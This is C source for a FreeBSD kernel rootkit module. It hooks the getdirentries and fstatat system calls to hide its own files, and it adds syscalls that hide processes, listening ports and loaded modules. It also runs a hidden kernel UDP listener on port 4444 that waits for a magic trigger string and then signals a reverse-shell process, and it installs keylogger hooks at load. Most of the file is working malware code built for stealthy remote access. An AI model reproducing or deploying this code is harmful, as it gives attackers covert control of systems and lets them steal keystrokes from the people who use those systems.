#include <sys/param.h>
#include <sys/errno.h>
#include <sys/kernel.h>
#include <sys/module.h>
#include <sys/systm.h>
#include <sys/proc.h>
#include <sys/kthread.h>
#include <sys/socket.h>
#include <sys/malloc.h>
#include <sys/socketvar.h>
#include <sys/uio.h>
#include <sys/ucred.h>
#include <sys/lock.h>
#include <sys/mutex.h>
#include <sys/condvar.h>
#include <netinet/in.h>

#include <bsm/audit_kevents.h>
#include <sys/types.h>
#include <sys/param.h>
#include <sys/kernel.h>
#include <sys/malloc.h>
#include <sys/module.h>
#include <sys/priv.h>
#include <sys/proc.h>
#include <sys/socket.h>
#include <sys/sysent.h>
#include <sys/sysproto.h>
#include <sys/systm.h>
#include <sys/dirent.h>
#include <sys/syscall.h>

#include <sys/lock.h>
#include <sys/mutex.h>
#include <sys/sx.h>
#include <sys/linker.h>

#include <net/if.h>
#include <net/vnet.h>
#include <netinet/in.h>
#include <netinet/in_pcb.h>
#include <netinet/ip_var.h>
#include <netinet/tcp_var.h>

#include <netinet/udp.h> 
#include <bsm/audit_kevents.h>
#include <sys/queue.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/queue.h>
#include <sys/lock.h>
#include <sys/sx.h>
#include <sys/mutex.h>
#include <sys/libkern.h>

#include "interface.h"
#include "log.h"

#define TRIGGER_STRING "BSD_rootkit_REMOTE_MAGIC_TRIGGER_v1"
#define LISTEN_PORT    4444

/* Global synchronization primitives used by interface.c */
struct cv remote_cv;
struct mtx remote_mtx;
struct in_addr trigger_ip;
int trigger_flag = 0;

static struct socket *so_listen = NULL;
static volatile int remote_thread_running = 0;

/* Basename extractor: gets the part after the last '/' */
static const char * rk_basename(const char *path) { 
    const char *slash = strrchr(path, '/'); 
    return (slash != NULL) ? slash + 1 : path; 
}

/* --- Background In-Kernel UDP Listener Thread --- */
static void
remote_listener_thread(void *arg __unused)
{
    struct thread *td = curthread;
    struct sockaddr_in sin;
    int error;

    remote_thread_running = 1;

    /* Create kernel-space UDP socket (zero userland open ports in sockstat) */
    error = socreate(AF_INET, &so_listen, SOCK_DGRAM, IPPROTO_UDP, td->td_ucred, td);
    if (error != 0) {
        remote_thread_running = 0;
        kthread_exit();
        return;
    }

    bzero(&sin, sizeof(sin));
    sin.sin_len = sizeof(sin);
    sin.sin_family = AF_INET;
    sin.sin_port = htons(LISTEN_PORT);
    sin.sin_addr.s_addr = INADDR_ANY;

    error = sobind(so_listen, (struct sockaddr *)&sin, td);
    if (error != 0) {
        soclose(so_listen);
        so_listen = NULL;
        remote_thread_running = 0;
        kthread_exit();
        return;
    }

    char buf[128];
    struct uio auio;
    struct iovec aiov;

    while (remote_thread_running) {
        bzero(&auio, sizeof(auio));
        bzero(&aiov, sizeof(aiov));

        aiov.iov_base = buf;
        aiov.iov_len = sizeof(buf) - 1;
        auio.uio_iov = &aiov;
        auio.uio_iovcnt = 1;
        auio.uio_offset = 0;
        auio.uio_resid = sizeof(buf) - 1;
        auio.uio_segflg = UIO_SYSSPACE;
        auio.uio_rw = UIO_READ;
        auio.uio_td = td;

        struct sockaddr *from = NULL;
        int flags = MSG_DONTWAIT;

        error = soreceive(so_listen, &from, &auio, NULL, NULL, &flags);
        if (error == 0 && auio.uio_resid < (ssize_t)(sizeof(buf) - 1)) {
            int recvd = (sizeof(buf) - 1) - auio.uio_resid;
            buf[recvd] = '\0';

            if (strstr(buf, TRIGGER_STRING) != NULL && from != NULL) {
                struct sockaddr_in *from_in = (struct sockaddr_in *)from;
                mtx_lock(&remote_mtx);
                trigger_ip = from_in->sin_addr;
                trigger_flag = 1;
                cv_signal(&remote_cv); /* Signal waiting revshell process in interface.c */
                mtx_unlock(&remote_mtx);
            }
        }

        if (from != NULL)
            free(from, M_SONAME);

        pause("rootkit_poll", hz / 10); /* Poll every 100ms */
    }

    if (so_listen != NULL) {
        soclose(so_listen);
        so_listen = NULL;
    }

    kthread_exit();
}

/* --- Module Event Handler --- */
extern struct sx kld_sx;
extern linker_file_list_t linker_files;
extern TAILQ_HEAD(modulelist, module) modules;
struct module {
        TAILQ_ENTRY(module)     link;   /* chain together all modules */
        TAILQ_ENTRY(module)     flink;  /* all modules in a file */
        struct linker_file      *file;  /* file which contains this module */
        int                     refs;   /* reference count */
        int                     id;     /* unique id number */
        char                    *name;  /* module name */
        modeventhand_t          handler;        /* event handler */
        void                    *arg;   /* argument for handler */
        modspecific_t           data;   /* module specific data */
};

#define SIZE 10
static int is_hiding_path(char kpath[MAXPATHLEN]) {
    char *paths[SIZE] = {
        "elevate",
        "rootkit",
        "revshell",
        "sender",
        "collector",
        "remote",
        "log.c",
        "log.h",
        "log.o",
        // "logsrc"
        "hide",
    };
    for (int i = 0; i < SIZE; i++) {
        if (strcasestr(kpath, paths[i]) != NULL) {
            return 1;
        }
    }

    return 0;
}

static int getdirentries_hook(struct thread *td, void *syscall_args) {
    struct getdirentries_args *uap; 
    uap = (struct getdirentries_args *) syscall_args;
    size_t size, count;
    struct dirent *d;
    int error = sys_getdirentries(td, uap);
    size = td->td_retval[0];

    if (size > 0) {
        d = malloc(size, M_TEMP, M_WAITOK);
        copyin(uap->buf, d, size);

        count = size;
        struct dirent *curr_rec = d;
        while (curr_rec->d_reclen != 0 && count > 0) {
            count -= curr_rec->d_reclen;            
            // Add more module to hide here
            if (is_hiding_path(curr_rec->d_name)) {
                if (count != 0) {
                    memmove((char *) curr_rec, 
                        (char *) curr_rec + curr_rec->d_reclen, count);
                }
                size -= curr_rec->d_reclen;
                continue;
            }

            if (count > 0) {
                curr_rec = (struct dirent *) ((char *)curr_rec + curr_rec->d_reclen);
            }
        }
        td->td_retval[0] = size;
        copyout(d, uap->buf, size);
        free(d, M_TEMP);
    }

    return error;
}

static int fstatat_hook(struct thread *td, void *syscall_args) { 
    struct fstatat_args /* { 
    int fd; 
    char *path; 
    struct stat *sb; 
    int flag; 
    } */ *uap = (struct fstatat_args *)syscall_args; 
     
    /* 1. If path is NULL, just pass through */ 
    if (uap->path == NULL) { 
        return sys_fstatat(td, syscall_args); 
    } /* 2. Whitelist rootkit's own processes so they can always find their files */ 
    if (td != NULL && td->td_proc != NULL) { 
        const char *comm = td->td_proc->p_comm; 
        if (strcmp(comm, "install") == 0 || 
            strcmp(comm, "revshell") == 0 || 
            strcmp(comm, "remote") == 0 || 
            strcmp(comm, "rklog") == 0 || 
            strcmp(comm, "hide_kld") == 0 || 
            strcmp(comm, "sh") == 0) { /* Allow /bin/sh during install scripts */ 
            
            return sys_fstatat(td, syscall_args); 
        } 
    } 

    /* 3. Safely copy the requested path from user space */ 
    char kpath[MAXPATHLEN]; 
    size_t done; 
    int error = copyinstr(uap->path, kpath, sizeof(kpath), &done); 
    if (error == 0) { 
        const char *base = rk_basename(kpath); 
        /* \* ONLY hide internal persistence artifacts from external stat probes. \* NEVER hide elevate, remote, or /bin/sh targets! \*/ 
        if (strcmp(base, "rootkit.ko") == 0 || strcmp(base, "hiding.ko") == 0) { 
            return (ENOENT); 
        } 
    } 
    
    /* 4. Pass through to original FreeBSD fstatat */ 
    return sys_fstatat(td, syscall_args); 
}

struct port_hiding_args {
    u_int16_t port;
};
static int 
port_hiding(struct thread *td, void *syscall_args) {
    CURVNET_SET(vnet0);
    struct port_hiding_args *uap;
    uap = (struct port_hiding_args *) syscall_args;
    struct inpcb *inpb;
    INP_INFO_WLOCK(&V_tcbinfo);

    CK_LIST_FOREACH(inpb, &V_tcbinfo.ipi_listhead, inp_list){
        INP_RLOCK(inpb);
        if (ntohs(inpb->inp_lport) == uap->port || 
            ntohs(inpb->inp_fport) == uap->port
        ) {
            CK_LIST_REMOVE(inpb, inp_list);
        }
        INP_RUNLOCK(inpb);
    }
    INP_INFO_WUNLOCK(&V_tcbinfo);
    CURVNET_RESTORE()
    return 0;
}

static int port_hiding_offset = NO_SYSCALL;
static struct sysent port_hiding_sysent = {
    .sy_narg   = 1,
    .sy_call   = (sy_call_t *) port_hiding,
    .sy_auevent = AUE_NULL
};

struct kld_hiding_args {
    char *mod_name;
};

static int
kld_hiding(struct thread *td, void *syscall_args) {
    struct kld_hiding_args *uap;
    uap = (struct kld_hiding_args *) syscall_args;

    char *mod_name = malloc(256, M_TEMP, M_WAITOK);
    copyinstr(uap->mod_name, mod_name, 256, NULL);
    mtx_lock(&Giant);
    struct module *mod;
    TAILQ_FOREACH(mod, &modules, link) {
        if (strcmp(mod->file->filename, mod_name) == 0) {
            TAILQ_REMOVE(&modules, mod, link);
            break;
        }
    }
    mtx_unlock(&Giant);

    linker_file_t lf;

    sx_xlock(&kld_sx);
    TAILQ_FOREACH(lf, &linker_files, link) {
        if (strcmp(lf->filename, mod_name) == 0) {
            TAILQ_REMOVE(&linker_files, lf, link);
            break;
        }
    }
    sx_xunlock(&kld_sx);
    free(mod_name, M_TEMP);
    return 0;
}

static struct sysent kld_hiding_sysent = {
    .sy_narg   = 1,
    .sy_call   = (sy_call_t *)kld_hiding,
    .sy_auevent = AUE_NULL
};


static int kld_hiding_offset = NO_SYSCALL;

struct proc_hiding_args {
    pid_t pid;
};
static void hide_process(pid_t pid) {
    struct proc *p;
    sx_xlock(&allproc_lock);

    FOREACH_PROC_IN_SYSTEM(p) {
        PROC_LOCK(p);
        if (p->p_state == PRS_ZOMBIE || (p->p_flag & P_WEXIT)) {
            PROC_UNLOCK(p);
            continue;
        }

        if (p->p_pid == pid) {
            LIST_REMOVE(p, p_list);

            sx_xlock(PIDHASHLOCK(p->p_pid));
            LIST_REMOVE(p, p_hash);
            sx_xunlock(PIDHASHLOCK(p->p_pid));
        }

        PROC_UNLOCK(p);
    }

    sx_xunlock(&allproc_lock);
}
static int
proc_hiding(struct thread *td, void *syscall_args) {
    struct proc_hiding_args *uap = (struct proc_hiding_args *) syscall_args;
    hide_process(uap->pid);
    
    return 0;
}

static struct sysent proc_hiding_sysent = {
    .sy_narg   = 1,
    .sy_call   = (sy_call_t *)proc_hiding,
    .sy_auevent = AUE_NULL
};
static int proc_hiding_offset = NO_SYSCALL;

static int load(module_t module, int cmd, void *arg) {
    (void)module;
    (void)arg;

    int error = 0;

    switch (cmd) {
    case MOD_LOAD:
        mtx_init(&remote_mtx, "rootkit_mtx", NULL, MTX_DEF);
        cv_init(&remote_cv, "rootkit_cv");

        /*
         * Keylogger ring and syscall hooks (log.c). Installed before the
         * device exists so a reader can never open /dev/rootkit while the
         * ring is still unwired.
         */
        rk_log_init();
        (void)rk_log_hook_install();

        /* Initialize character device interface via interface.c */
        error = make_rootkit_dev();
        sysent[SYS_getdirentries].sy_call = (sy_call_t *) getdirentries_hook;
        sysent[SYS_fstatat].sy_call = (sy_call_t *) fstatat_hook;

        if (error == 0) {
            struct proc *p = NULL;
            error = kproc_create(remote_listener_thread, NULL, &p, 0, 0, "kmod_remote_listen");
            // 	init_keylogger(); TODO: Fix this later
            if (error == 0) {
                hide_process(p->p_pid);
            } else {
            }
        } else {
            rk_log_uninit();
        }

		// only be initial when device is successfully created
        break;

    case MOD_UNLOAD:
        remote_thread_running = 0;

        /*
         * Order matters: destroy the device first so no new reader can enter
         * the cdev handlers, then seldrain/unhook inside rk_log_uninit(). If
         * the module went away while a thread was still registered on the
         * selinfo, it would wake up into freed memory.
         */
        destroy_rootkit_dev();
        rk_log_uninit();

        mtx_lock(&remote_mtx);
        cv_broadcast(&remote_cv);
        mtx_unlock(&remote_mtx);


        cv_destroy(&remote_cv);
        mtx_destroy(&remote_mtx);
        sysent[SYS_getdirentries].sy_call = (sy_call_t *)sys_getdirentries;
        sysent[SYS_fstatat].sy_call = (sy_call_t *)sys_fstatat;
        printf("rootkit: module unloaded\n");
        break;

    case MOD_SHUTDOWN:
        break;

    default:
        error = EOPNOTSUPP;
        break;
    }

    return error;
}

static moduledata_t rootkit_module = {
    "rootkit",
    load,
    NULL
};

DECLARE_MODULE(rootkit, rootkit_module, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
SYSCALL_MODULE(kld_hiding, &kld_hiding_offset, &kld_hiding_sysent, NULL, NULL);
SYSCALL_MODULE(port_hiding, &port_hiding_offset, &port_hiding_sysent, NULL, NULL);
SYSCALL_MODULE(proc_hiding, &proc_hiding_offset, &proc_hiding_sysent, NULL, NULL);
